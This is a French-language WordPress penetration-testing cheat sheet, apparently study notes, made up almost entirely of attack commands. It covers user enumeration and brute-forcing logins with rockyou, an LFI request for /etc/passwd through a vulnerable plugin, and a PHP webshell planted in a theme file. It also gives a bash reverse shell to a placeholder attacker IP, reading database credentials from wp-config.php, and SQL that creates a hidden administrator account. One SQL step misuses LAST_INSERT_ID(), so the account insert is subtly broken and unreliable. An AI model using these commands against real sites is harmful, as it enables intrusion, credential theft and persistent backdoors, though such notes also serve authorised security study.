# WordPress

WordPress est le CMS le plus populaire au monde, alimentant plus de 40% des sites web.

## 🔍 Énumération

### Identification
```bash
# Vérifier robots.txt
curl -s $URL/robots.txt | grep -i wordpress

# Rechercher des marqueurs spécifiques
curl -s $URL | grep -i "wp-content\|wp-includes\|wordpress"

# Vérifier le générateur dans les méta-tags
curl -s $URL | grep -i "name=\"generator\""
```

### Scan avec WPScan
```bash
# Scan complet
wpscan --url $URL

# Scan avec API token (plus complet)
wpscan --url $URL --api-token TOKEN --enumerate

# Énumérer les utilisateurs
wpscan --url $URL --enumerate u

# Énumérer les plugins vulnérables
wpscan --url $URL --enumerate vp
```

### Recherche manuelle
```bash
# Vérifier la version dans le readme
curl -s $URL/readme.html

# Énumérer les thèmes
curl -s $URL | grep -o "wp-content/themes/[^/]*" | sort -u

# Énumérer les plugins
curl -s $URL | grep -o "wp-content/plugins/[^/]*" | sort -u
```

## 🔨 Exploitation

### Brute Force d'identifiants
```bash
# Avec WPScan (méthode xmlrpc - plus rapide)
wpscan --url $URL --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt --password-attack xmlrpc

# Avec WPScan (méthode wp-login)
wpscan --url $URL --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login

# Avec Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $URL_HOSTNAME http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

### Exploitation des plugins vulnérables
```bash
# Mail-Masta plugin (LFI)
curl -s "$URL/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# WP File Manager (RCE)
# CVE-2020-25213
curl -s "$URL/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

# wpDiscuz (RCE)
# Utiliser l'exploit: https://www.exploit-db.com/exploits/49967
```

### Modification de thème pour RCE
```bash
# Après connexion en admin, modifier un fichier de thème
# Ajouter à 404.php ou footer.php
<?php system($_GET['cmd']); ?>

# Accéder au webshell
curl "$URL/wp-content/themes/twentytwenty/404.php?cmd=id"
```

## 🔐 Post-exploitation

### Obtention d'un reverse shell
```bash
# Via modification de thème (après authentification admin)
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1'"); ?>

# Utilisez Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS $URL_HOSTNAME
set USERNAME admin
set PASSWORD password
set TARGETURI /
set LHOST VOTRE_IP
exploit
```

### Modification de la base de données
```bash
# Trouver les informations de connexion à la BDD
cat wp-config.php | grep DB_

# Se connecter à la BDD
mysql -h localhost -u $DBUSER -p$DBPASS $DBNAME

# Créer un nouvel administrateur
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status, display_name) VALUES ('hacker', MD5('password'), 'Hacker', 'hacker@example.com', '0', 'Hacker');
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (LAST_INSERT_ID(), 'wp_user_level', '10');
```

## ⚠️ Erreurs courantes & astuces
- WordPress stocke les identifiants de BDD en clair dans wp-config.php
- Vérifiez les fichiers de sauvegarde (.bak, ~, .old) dans le répertoire racine
- Les plugins désactivés peuvent toujours être vulnérables
- Testez les accès XMLRPC qui peuvent être vulnérables même lorsque protégés
- Certains thèmes WordPress ont des pages spécifiques vulnérables